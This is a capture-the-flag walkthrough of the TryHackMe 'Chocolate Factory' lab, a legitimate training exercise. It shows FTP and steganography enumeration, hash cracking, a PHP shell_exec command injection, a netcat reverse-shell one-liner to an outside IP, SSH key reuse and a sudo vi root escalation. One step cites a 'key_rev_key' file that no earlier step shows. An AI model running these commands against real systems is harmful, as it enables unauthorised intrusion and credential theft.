---

Name: Chocolate Factory
Difficulty: Easy
URL: https://tryhackme.com/room/chocolatefactory
Description: This room was designed so that hackers can revisit the Willy Wonka's Chocolate Factory and meet Oompa Loompa 

---

# Rustscan

We start with a full port scan to see what services are running.

```bash
$ rustscan -a 10.113.133.219 -r 1-65535 --ulimit 5000 -- -sC -sV
```

The scan shows several open ports, including FTP, SSH, and HTTP:

```text
Open 10.113.133.219:21
Open 10.113.133.219:22
Open 10.113.133.219:80
...
```

The most interesting services to check first are FTP and HTTP.

# FTP

FTP allows anonymous login, so we connect and check what files are available.

```bash
$ ftp 10.113.133.219
Connected to 10.113.133.219 (10.113.133.219).
220 (vsFTPd 3.0.5)
Name (10.113.133.219:theo): anonymous
331 Please specify the password.
Password:
230 Login successful.
```

Listing the directory reveals an image:

```text
-rw-rw-r--    1 1000     1000       208838 Sep 30  2020 gum_room.jpg
```

We download it:

```text
ftp> get gum_room.jpg
```

It's an image containing some gum, which suggests there might be something hidden inside it.

## Stegseek

We can use `stegseek` to check the image for hidden data.

```bash
$ stegseek gum_room.jpg
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: ""
[i] Original filename: "b64.txt".
[i] Extracting to "gum_room.jpg.out".
```

The extracted file contains Base64-encoded data:

```bash
$ cat gum_room.jpg.out
ZGFlbW9uOio6MTgzODA6MDo5OTk5OTo3Ojo6CmJpbjoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpzeXM6...
```

We decode it:

```bash
base64 -d gum_room.jpg.out
```

This gives us the contents of `/etc/passwd`. Most accounts are system users, but one entry stands out:

```text
charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7:::
```

The `$6$` indicates a SHA-512 crypt password hash.

We save the hash:

```bash
echo 'charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/' > charlie.hash
```

Then crack it with John:

```bash
$ john --wordlist=/usr/share/wordlists/rockyou.txt charlie.hash
```

We get:

```text
cn7824           (charlie)
```

So Charlie's password is:

```text
cn7824
```

# Gobuster

Next, we enumerate the web server.

```bash
$ gobuster dir -url http://10.113.133.219/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -t 100 -x txt,php,html,bak,zip,log,old,js -k
```

Among the results, we find:

```text
home.php             (Status: 200) [Size: 569]
index.html           (Status: 200) [Size: 1466]
index.php.bak        (Status: 200) [Size: 273]
```

The backup file looks interesting.

```php
<html>
<body>
<form method="POST">
    <input id="comm" type="text" name="command" placeholder="Command">
    <button>Execute</button>
</form>
<?php
    if(isset($_POST['command']))
    {
        $cmd = $_POST['command'];
        echo shell_exec($cmd);
    }
?>
```

The application passes our input directly to `shell_exec()`, giving us command execution.

# Running Commands

Running `id` gives:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data),0(root),27(sudo),108(lxd)
```

We can use the command injection to get a reverse shell:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.131.170 4444 >/tmp/f
```

# Finding Charlie's SSH Key

We can now inspect Charlie's home directory.

```bash
www-data@ip-10-113-133-219:/home/charlie$ ls -la
```

We find an SSH private key:

```text
-rw-r--r-- 1 charlie charley 1675 Oct  6  2020 teleport
-rw-r--r-- 1 charlie charley  407 Oct  6  2020 teleport.pub
-rw-r----- 1 charlie charley   39 Oct  6  2020 user.txt
```

We can read the private key:

```bash
cat teleport
```

We copy it to our machine and fix the permissions:

```bash
chmod 600 teleport
```

Then connect as Charlie:

```bash
ssh -i teleport charlie@10.113.133.219
```

We are now Charlie:

```bash
charlie@ip-10-113-133-219:/$ id
uid=1000(charlie) gid=1000(charley) groups=1000(charley),0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

We can also read the user flag:

```bash
cat /home/charlie/user.txt
```

# Privilege Escalation

Let's check Charlie's sudo permissions:

```bash
charlie@ip-10-113-133-219:/home/charlie$ sudo -l
```

We get:

```text
User charlie may run the following commands on ip-10-113-133-219:
    (ALL : !root) NOPASSWD: /usr/bin/vi
```

Charlie can run `vi` with sudo without entering a password.

Since `vi` can execute shell commands, we can use it to get a root shell. This technique is also listed on GTFOBins:

https://gtfobins.org/gtfobins/vi/#shell

```bash
sudo vi -c ':!/bin/sh' /dev/null
```

Then:

```bash
# id
uid=0(root) gid=0(root) groups=0(root)
```

We are root!

# Getting the Root Flag

Inside `/root` we find `root.py`:

```python
from cryptography.fernet import Fernet
import pyfiglet

key=input("Enter the key:  ")
f=Fernet(key)

encrypted_mess = 'gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ'

dcrypt_mess=f.decrypt(encrypted_mess)
mess=dcrypt_mess.decode()

display1=pyfiglet.figlet_format("You Are Now The Owner Of ")
display2=pyfiglet.figlet_format("Chocolate Factory ")

print(display1)
print(display2)
print(mess)
```

Earlier, we found `key_rev_key`, which contains:

```text
congratulations you have found the key:
b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
```

So the key is:

```text
-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=
```

There is a small issue with the original script. `Fernet.decrypt()` expects the encrypted token as bytes, so we can modify the script slightly:

```python
from cryptography.fernet import Fernet
import pyfiglet

key = b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='

f = Fernet(key)

encrypted_mess = b'gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ'

dcrypt_mess = f.decrypt(encrypted_mess)
mess = dcrypt_mess.decode()

display1 = pyfiglet.figlet_format("You Are Now The Owner Of ")
display2 = pyfiglet.figlet_format("Chocolate Factory ")

print(display1)
print(display2)
print(mess)
```

Now we run it:

```bash
python3 root.py
```

And we get the root flag.
